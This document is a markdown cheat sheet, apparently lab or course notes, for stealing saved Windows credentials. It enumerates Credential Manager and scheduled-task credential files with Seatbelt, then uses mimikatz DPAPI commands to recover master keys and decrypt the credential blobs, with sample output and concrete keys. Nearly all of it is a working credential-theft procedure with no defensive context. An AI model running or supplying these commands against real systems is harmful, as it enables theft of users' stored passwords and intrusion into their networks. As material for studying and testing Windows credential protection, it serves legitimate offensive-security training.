# There are two types of vaults

- Web Credentials
- Windows Credentials

# Credential Manager

```bash
# Seatbelt (this will run as the current user)
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

# The credentials themsleves are stored in Credentials directory
ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
# or ! Run this !
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

====== WindowsCredentialFiles ======

  Folder : C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

    FileName     : 6C33AC85D0C4DCEAB186B3B2E5B1AC7C
    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    ...

    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D
    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    ...


# Get master key to decrypt the credentials
#> Requires Elevated Privileges but it might not be there
mimikatz !sekurlsa::dpapi

...

   GUID    : {bfc5090d-22fe-4058-8953-47f6882f549e} # GUID needs to match the master key of the credential files
 * MasterKey :	8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

# Get the SID for bfarmer
Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq "bfarmer" } | Select-Object Name, SID
#> Does not require elevated privileges
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

# Decrypt the blob using the master key

mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```

---

# Scheduled task credentials (same as above but on Scheduled tasks)

```bash
# Check if there are credentials
ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 10kb     fil     08/30/2022 12:42:24   DFBE70A7E5CC19A398EBF1B96859CE5D
 528b     fil     08/16/2022 14:55:28   F3190EBE0498B77B4A85ECBABCA19B6E

# Check GUID for master key
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

# Dump cached keys to get master key
mimikatz !sekurlsa::dpapi
    {guidMasterKey from previous command}
     ...
	 * MasterKey :	10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

# Decrypt the credentials in the scheduled tasks
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
```
